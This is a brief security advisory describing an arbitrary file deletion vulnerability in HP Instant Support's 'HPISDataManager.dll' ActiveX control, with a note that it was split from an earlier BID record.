HP Instant Support 'HPISDataManager.dll' ActiveX control is prone to a vulnerability that lets attackers delete arbitrary files on the affected computer in the context of the application using the ActiveX control. Successful attacks can result in denial-of-service conditions.

NOTE: This issue was previously covered in BID 29526 (HP Instant Support 'HPISDataManager.dll' ActiveX Control Unspecified Code Execution Vulnerabilities), but has been given its own record because of new information.
